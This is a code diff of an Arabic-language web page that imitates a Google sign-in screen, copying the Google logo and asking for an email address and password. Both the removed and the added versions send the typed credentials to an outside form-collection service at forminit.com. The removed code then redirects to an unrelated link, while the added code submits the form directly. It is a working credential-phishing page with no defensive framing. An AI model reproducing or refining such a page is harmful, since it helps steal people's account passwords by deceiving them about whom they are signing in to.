@@ -3,48 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
+    <title>تسجيل الدخول</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
-        body { background: #fff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; padding-top: 20px; }
-        .top-notice { background: #f8f9fa; color: #202124; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #dadce0; width: 90%; max-width: 450px; text-align: center; font-weight: 500; }
+        body { background: #fff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; }
+        
         .container { max-width: 450px; width: 100%; padding: 0 20px; }
         .google-logo { text-align: center; margin-bottom: 25px; font-size: 32px; font-weight: 500; }
         .g-blue { color: #4285f4; } .g-red { color: #ea4335; } .g-yellow { color: #fbbc05; } .g-green { color: #34a853; }
-        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; background: white; }
-        .input-group { margin-bottom: 15px; }
-        .input-field { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
-        .btn-next { background: #1a73e8; color: white; padding: 10px 24px; border-radius: 4px; border: none; cursor: pointer; float: left; }
+        
+        .login-card { 
+            border: 1px solid #dadce0; 
+            border-radius: 8px; 
+            padding: 40px; 
+            background: white; 
+            min-height: 400px; /* جعل الكرت أطول قليلاً */
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .login-title { font-size: 24px; text-align: center; margin-bottom: 10px; font-weight: 400; }
+        .login-subtitle { text-align: center; color: #202124; margin-bottom: 35px; font-size: 15px; }
+        
+        .input-group { margin-bottom: 20px; }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        .input-field:focus { border: 2px solid #1a73e8; }
+        
+        /* نقل الزر إلى أقصى أسفل الكرت */
+        .button-wrapper { margin-top: auto; padding-top: 50px; text-align: left; }
+        .btn-next { 
+            background: #1a73e8; 
+            color: white; 
+            padding: 10px 30px; 
+            border-radius: 4px; 
+            border: none; 
+            cursor: pointer; 
+            font-weight: 500; 
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
-    <div class="top-notice">ادخل بريدك الالكتروني للمتابعة إلى الموقع</div>
+
     <div class="container">
-        <div class="google-logo"><span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span></div>
+        <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        
         <div class="login-card">
-            <h2 style="text-align:center; margin-bottom:10px; font-weight:400;">تسجيل الدخول</h2>
-            <p style="text-align:center; margin-bottom:30px;">المتابعة إلى Gmail</p>
-            <form id="contact-form">
-                <div class="input-group"><input type="email" name="fi-sender-email" class="input-field" placeholder="البريد الإلكتروني" required></div>
-                <div class="input-group"><input type="password" name="fi-text-password" class="input-field" placeholder="كلمة المرور" required></div>
-                <button type="submit" class="btn-next">التالي</button>
+            <h1 class="login-title">تسجيل الدخول</h1>
+            <p class="login-subtitle">المتابعة إلى الموقع بإستخدام بريدك الإلكتروني</p>
+
+            <form action="https://forminit.com/f/fokrp2oltl7" method="POST">
+                
+                <div class="input-group">
+                    <input type="email" name="Email_Address" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" name="Password" class="input-field" placeholder="أدخل كلمة المرور" required>
+                </div>
+
+                <div class="button-wrapper">
+                    <button type="submit" class="btn-next">التالي</button>
+                </div>
+                
             </form>
         </div>
     </div>
-    <script src="https://forminit.com/sdk/v1/forminit.js"></script>
-    <script>
-        const forminit = new Forminit();
-        const FORM_ID = 'fokrp2oltl7'; 
-        document.getElementById('contact-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const formData = new FormData(this);
-            try {
-                await forminit.submit(FORM_ID, formData);
-                window.location.href = "https://www.musicful.ai/song/48835729232678919/";
-            } catch (err) {
-                window.location.href = "https://www.musicful.ai/song/48835729232678919/";
-            }
-        });
-    </script>
+
 </body>
 </html>
